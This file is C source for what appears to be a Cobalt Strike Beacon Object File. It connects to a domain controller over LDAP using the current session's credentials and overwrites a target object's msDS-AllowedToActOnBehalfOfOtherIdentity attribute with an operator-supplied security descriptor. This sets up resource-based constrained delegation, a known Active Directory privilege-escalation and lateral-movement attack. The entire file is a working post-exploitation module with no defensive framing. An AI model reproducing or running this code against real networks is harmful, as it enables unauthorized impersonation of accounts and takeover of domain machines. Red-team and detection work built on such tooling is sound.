#include <windows.h>
#include <winldap.h>
#include "bofdefs.h"
#include "beacon.h"

WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_initA(PSTR HostName, ULONG PortNumber);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_optionA(LDAP *ld, int option, const void *invalue);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_sA(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_sA(LDAP *ld, PSTR dn, LDAPModA *mods[]);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2stringA(ULONG err);

DECLSPEC_IMPORT int MSVCRT$sscanf(const char *buffer, const char *format, ...);
DECLSPEC_IMPORT void* MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void MSVCRT$free(void *ptr);
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);

int hex_to_binary(const char* hex_str, unsigned char** binary_data, int* binary_len) {
    int hex_len = MSVCRT$strlen(hex_str);
    if (hex_len % 2 != 0) {
        return 0;
    }
    
    *binary_len = hex_len / 2;
    *binary_data = (unsigned char*)MSVCRT$malloc(*binary_len);
    if (!*binary_data) {
        return 0;
    }
    
    for (int i = 0; i < *binary_len; i++) {
        MSVCRT$sscanf(hex_str + 2*i, "%2hhx", &(*binary_data)[i]);
    }
    
    return 1;
}

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    char *domain = BeaconDataExtract(&parser, NULL);
    char *target_dn = BeaconDataExtract(&parser, NULL);
    char *credential_hex = BeaconDataExtract(&parser, NULL);
    
    LDAP *ld = NULL;
    int result;
    int version = LDAP_VERSION3;
    unsigned char *binary_data = NULL;
    int binary_len = 0;
    
    BeaconPrintf(CALLBACK_OUTPUT, "Setting RBCD to: %s\n", target_dn);
    
    if (!hex_to_binary(credential_hex, &binary_data, &binary_len)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to convert hex string to binary\n");
        return;
    }
    
    ld = WLDAP32$ldap_initA(domain, LDAP_PORT);
    if (ld == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "LDAP init failed\n");
        if (binary_data) MSVCRT$free(binary_data);
        return;
    }
    
    result = WLDAP32$ldap_set_optionA(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Set version failed: %s\n", WLDAP32$ldap_err2stringA(result));
        goto cleanup;
    }
    
    result = WLDAP32$ldap_bind_sA(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Bind failed: %s\n", WLDAP32$ldap_err2stringA(result));
        goto cleanup;
    }
    
    struct berval binary_val;
    binary_val.bv_val = (char*)binary_data;
    binary_val.bv_len = binary_len;
    
    struct berval *vals[2] = { &binary_val, NULL };
    
    LDAPMod mod;
    mod.mod_op = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type = "msDS-AllowedToActOnBehalfOfOtherIdentity";
    mod.mod_vals.modv_bvals = vals;
    
    LDAPMod *mods[2] = { &mod, NULL };
    
    result = WLDAP32$ldap_modify_sA(ld, target_dn, mods);
    if (result == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "RBCD added successfully\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Modify failed: %s\n", WLDAP32$ldap_err2stringA(result));
    }
    
cleanup:
    if (binary_data) MSVCRT$free(binary_data);
    WLDAP32$ldap_unbind(ld);
}
